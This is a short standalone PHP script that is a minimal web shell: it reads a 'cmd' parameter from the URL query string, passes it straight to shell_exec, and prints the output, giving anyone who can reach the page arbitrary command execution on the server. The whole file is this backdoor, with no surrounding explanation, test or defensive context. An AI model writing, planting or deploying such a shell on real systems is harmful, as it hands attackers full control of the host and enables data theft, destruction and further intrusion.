<?php
if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    $output = shell_exec($command);
    echo "<pre>$output</pre>";
}
?>

